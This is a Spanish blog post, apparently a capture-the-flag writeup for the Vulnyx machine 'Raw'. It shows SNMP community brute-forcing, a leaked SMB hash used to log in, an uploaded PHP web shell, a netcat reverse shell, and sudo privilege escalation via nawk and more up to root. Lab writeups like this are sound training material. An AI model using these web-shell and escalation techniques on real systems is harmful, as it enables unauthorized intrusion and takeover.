---
layout: post
title: Raw - Vulnyx
---

# Writeup
![Raw]({{'/assets/img/Raw/raw.png' | relative_url}})

Vulnyx

----------------------------------------------------------------------------------------------

Iniciamos el escaneo con **Nmap** en busca de puertos expuestos y reconocer los sevicios que los ocupan, para posteriormente buscar vulnerabilidades.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.2.234 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 21:52 CEST
Initiating ARP Ping Scan at 21:52
Scanning 192.168.2.234 [1 port]
Completed ARP Ping Scan at 21:52, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:52
Scanning 192.168.2.234 [65535 ports]
Discovered open port 80/tcp on 192.168.2.234
Discovered open port 22/tcp on 192.168.2.234
Discovered open port 3000/tcp on 192.168.2.234
Completed SYN Stealth Scan at 21:52, 0.45s elapsed (65535 total ports)
Nmap scan report for 192.168.2.234
Host is up, received arp-response (0.00010s latency).
Scanned at 2024-04-09 21:52:04 CEST for 1s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
MAC Address: 08:00:27:CB:12:5C (Oracle VirtualBox virtual NIC)
```
```bash
❯ nmap -sCV -p22,80,3000 192.168.2.234 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 21:52 CEST
Nmap scan report for raw (192.168.2.234)
Host is up (0.00017s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http         Apache httpd 2.4.56 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.56 (Debian)
3000/tcp open  microsoft-ds
| fingerprint-strings: 
|   SMBProgNeg: 
|     SMBr
|_    "3DUfw
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=4/9%Time=66159CD9%P=x86_64-pc-linux-gnu%r(
SF:SMBProgNeg,51,"\0\0\0M\xffSMBr\0\0\0\0\x80\0\xc0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0@\x06\0\0\x01\0\x11\x07\0\x03\x01\0\x01\0\0\xfa\0\0\0\0\x01\0\0\0\
SF:0\0p\0\0\0\0\0\0\0\0\0\0\0\0\0\x08\x08\0\x11\"3DUfw\x88");
MAC Address: 08:00:27:CB:12:5C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Analizando el reporte de nmap el puerto **80 - http** no tiene absolutamente nada y el puerto **3000** es una conexion samba, que sin usuario ni credenciales aun no puede hacer nada.

Decido hacer otro escaneo por **UDP** y veo un puerto con el servicio **snmp** y me enfoco ahi.
```bash
❯ nmap -sU --top-port 1000 -T5 -vvv -n -Pn 192.168.2.234 -oN updPort
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 22:11 CEST
Initiating ARP Ping Scan at 22:11
Scanning 192.168.2.234 [1 port]
Completed ARP Ping Scan at 22:11, 0.05s elapsed (1 total hosts)
Initiating UDP Scan at 22:11
Scanning 192.168.2.234 [1000 ports]
Warning: 192.168.2.234 giving up on port because retransmission cap hit (2).

161/udp   open          snmp            udp-response ttl 64
```
* [Infomacion SNMP](https://www.whatsupgold.com/es/snmp)

Con la herramienta **onesixtyone** y diccionario de **community name** con la que hacer fuerza bruta, para posteriormente si hay exito probra con otra herramienta y dumpear mas informacion.
```bash
❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.2.234
Scanning 1 hosts, 3219 communities
192.168.2.234 [wally] Linux raw 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64
```
Hay suerte con la **community name**, ahora con **snmpbulkwalk** enumerar informacin de la maquina victima
```bash
❯ snmpbulkwalk -c wally -v2c 192.168.2.234

HOST-RESOURCES-MIB::hrSWRunParameters.375 = STRING: "-c /usr/local/bin/smbserver.py share /var/www/html/B@ckUpW@lly -username wally -hashes ':3B***************************BA7' -smb2"
```
Entre tanto dato que arroja la herramienta hay un comando que filtra un nombre de usuario y un hash para conecsion **smbserver**

Me conecto al puerto **3000** la carpeta por defecto **share** y... no hay nada, pero apunta a un directorio del servidor web y en el que puedo subir archivos.
```bash
❯ smbclient //192.168.2.234/share -U wally --pw-nt-hash '3B***************************BA7' -p 3000 -d
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D     4096  Wed Nov 29 11:06:02 2023
  ..                                  D     4096  Wed Nov 29 11:46:54 2023

        148529400 blocks of size 1024. 14851044 blocks available

smb: \> put cmd.php
putting file cmd.php as \cmd.php (10,7 kb/s) (average 10,7 kb/s)
smb: \> ls
  cmd.php                            AN       33  Tue Apr  9 23:13:11 2024

		148529400 blocks of size 1024. 14851044 blocks available

```
* Archivo **cmd.php**

```php
<?php
  system($_GET['cmd']);
?>
```
Por lo tanto me creo un pequeño archivo **php** que me proporcione ejecucion remota de comando y pueda enviarme una **reverse-shell**

Compruebo que funciona apuntando al **/etc/passwd**, con exito.
![passwd]({{'/assets/img/Raw/passwd.png' | relative_url }})

Escribo el comando para una reverse-shell.
![reverse-shell]({{'/assets/img/Raw/reverse-shell.png' | relative_url }})

Estoy dentro, como el usuario **wally**
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.2.128] from (UNKNOWN) [192.168.2.234] 42190
bash: cannot set terminal process group (451): Inappropriate ioctl for device
bash: no job control in this shell
wally@raw:/var/www/html/B@ckUpW@lly$ whoami
wally
wally@raw:/var/www/html/B@ckUpW@lly$ hostname -I
192.168.2.234 
wally@raw:/var/www/html/B@ckUpW@lly$ cd /home/wally
wally@raw:/home/wally$ cat user.txt 
e89**************************3af
wally@raw:/home/wally$ sudo -l
Matching Defaults entries for wally on raw:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wally may run the following commands on raw:
    (loko) NOPASSWD: /usr/bin/nawk

```
Puedo ejecutar el archivo binario **nawk** como el usuario **loko**, me da la impresion que tendre que hacer pivoting de usuario.

Busco informacion sobre dicho ejecutable, para ver posible pivotage de usuario.
* [GTFOBINS - nawk - binary](https://gtfobins.github.io/gtfobins/nawk/)

Un simple vistazo y un comando rapido me dara la entrada al usuario **loko**.

Y este usuario tiene otra sorpresita.
```bash
wally@raw:/var/www/html/B@ckUpW@lly$ sudo -u loko /usr/bin/nawk 'BEGIN {system("/bin/bash")}'         
<-u loko /usr/bin/nawk 'BEGIN {system("/bin/bash")}'
whoami
loko
loko@raw:/var/www/html/B@ckUpW@lly$ sudo -l
Matching Defaults entries for loko on raw:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User loko may run the following commands on raw:
    (root) NOPASSWD: /usr/bin/more /root/Pwn3d
```
* [GTFOBINS - more -binary](https://gtfobins.github.io/gtfobins/more/)

En el siguguiente enlace se pudede encontrar informacion sobre el binario. 
Pero en este caso la vulnerabilidad reside en la oportunidad de leer el archivo **Pwn3d** con privilegio **sudo**, 
hay que forzar entrar en modo paginate y ejecutar la vulnerabilidad.

```bash
loko@raw:/var/www/html/B@ckUpW@lly$ stty size
28 213
loko@raw:/var/www/html/B@ckUpW@lly$ stty rows 5 columns 5
loko@
dPwn3d
Hi Ha
cker!
You d
id a 
--More--(45%)
```
Esta vulnerabilidad requiere de entrar en el modo paginate cuando se abre un archivo
```bash
root@raw:/home/loko# cd /root
root@raw:~# ls -la
total 36
drwx------  4 root root 4096 Nov 29 11:25 .
drwxr-xr-x 18 root root 4096 Nov 28 19:04 ..
lrwxrwxrwx  1 root root    9 Apr 23  2023 .bash_history -> /dev/null
-rw-------  1 root root 3526 Jan 15  2023 .bashrc
drwxr-xr-x  3 root root 4096 Aug  1  2023 .cache
drw-------  5 root root 4096 Nov 28 19:08 .local
-rw-------  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   66 Nov 28 19:19 .selected_editor
-r--------  1 root root   46 Nov 29 11:25 Pwn3d
-r--------  1 root root   33 Nov 29 11:10 rOOOOOt.txt
root@raw:~# cat rOOOOOt.txt
bad**************************8a9
```

Espro que te pueda servir de ayuda. GRACIAS por venir.
